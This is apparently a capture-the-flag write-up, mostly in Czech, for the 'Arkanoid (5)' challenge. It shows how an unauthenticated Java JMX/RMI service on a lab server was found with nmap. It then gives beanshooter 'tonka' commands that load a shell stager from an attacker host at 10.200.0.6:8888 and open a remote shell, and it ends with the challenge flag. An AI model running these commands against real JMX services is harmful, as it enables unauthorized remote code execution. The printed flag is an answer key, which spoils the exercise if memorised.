# Arkanoid (5)

## Zadání

Ahoy, officer,

a new server with a video game is to be placed in the ship's relaxation center . Your task is to check whether the server does not contain any vulnerabilities.

May you have fair winds and following seas!

The game server has domain name `arkanoid.cns-jv.tcc`.

## Nápovědy (Hints)

1. Use VPN to get access the server.
2. The Arkanoid appliance restarts every hour.

## Řešení

K řešení této úlohy je potřeba připojení pomocí VPN z úlohy [VPN access](../01_VPN_access/README.md)

Skenování portů `nmap -p- -A arkanoid.cns-jv.tcc` se zobrazí

```text
PORT      STATE SERVICE     VERSION
8000/tcp  open  http        JBoss Enterprise Application Platform
|_http-title: Gamedev Canvas Workshop - lesson 10: finishing up
38899/tcp open  tcpwrapped
60001/tcp open  java-rmi    Java RMI Registry
| rmi-dumpregistry:
|   jmxrmi
|      implements javax.management.remote.rmi.RMIServer,
|     extends
|       java.lang.reflect.Proxy
|       fields
|           Ljava/lang/reflect/InvocationHandler; h
|             java.rmi.server.RemoteObjectInvocationHandler
|             @localhost:60002
|             extends
|_              java.rmi.server.RemoteObject
60002/tcp open  rmiregistry Java RMI
```

Zajímavý je port 60001 se službou java-rmi se službou JMX. Pro útoky na tuto službu jsem použil beanshooter <https://github.com/qtc-de/beanshooter>.

Postupným zkoušením různých služeb vyjde najevo, že služba nevyžaduje autentizaci.

```text
[+] Checking for unauthorized access:
[+]
[+]     - Remote MBean server does not require authentication.
[+]       Vulnerability Status: Vulnerable
```

Pro otevření shellu se hodí modul [tonka shell](https://github.com/qtc-de/beanshooter#tonka-shell)

```text
java -jar beanshooter-4.1.0-jar-with-dependencies.jar tonka deploy arkanoid.cns-jv.tcc 60001 --stager-url http://10.200.0.6:8888
java -jar beanshooter-4.1.0-jar-with-dependencies.jar tonka shell arkanoid.cns-jv.tcc 60001
```

Hledaný FLAG není ukrytý mezi soubory, ale v proměnných prostředí. Stačí si je vypsat příkazem `set`.

[source.zip](source.zip) obsahuje zdrojový kód aplikace.

## Flag

`FLAG{sEYj-80fd-EtkR-0fHv}`
